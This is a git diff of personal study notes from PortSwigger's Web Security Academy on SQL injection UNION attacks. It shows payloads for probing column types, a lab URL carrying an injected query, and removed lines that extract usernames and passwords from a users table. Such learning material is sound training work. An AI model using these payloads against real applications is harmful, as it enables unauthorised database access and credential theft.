@@ -1,4 +1,4 @@
-# Web Hacking
+# Portswigger Academy
 
 These are notes that I compiled while learning from the Portswigger academy. The code is from them, although I will modify them according to my needs.
 
@@ -55,7 +55,7 @@ Modified:
 
 ### **Finding columns with a useful data type in an SQL injection UNION attack**
 
-**Replace 'a' with string you are looking for:**
+**Replace 'a' with string you are looking for**
 
 `' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'--`
 
@@ -67,23 +67,11 @@ Modified:
 
 `https://ac1f1f361f395e87c021394c00230079.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20NULL,%27FgYUb0%27,NULL--`
 
-### Using an SQL injection UNION attack to retrieve interesting data <a href="using-an-sql-injection-union-attack-to-retrieve-interesting-data" id="using-an-sql-injection-union-attack-to-retrieve-interesting-data"></a>
 
-The crucial information needed to perform this attack is that there is a table called `users` with two columns called `username` and `password`
 
-`' UNION SELECT username, password FROM users--`
 
-Regular:
 
-`https://ac401f231f831ad7c0283c9800910099.web-security-academy.net/filter?category=Accessories`
 
-Modified:
 
-`ac401f231f831ad7c0283c9800910099.web-security-academy.net/filter?category=Accessories' UNION SELECT username, password FROM users--`
 
-### Retrieving multiple values within a single column <a href="retrieving-multiple-values-within-a-single-column" id="retrieving-multiple-values-within-a-single-column"></a>
-
-This example is for Oracle DBs:
-
-`' UNION SELECT username || '~' || password FROM users--`
 
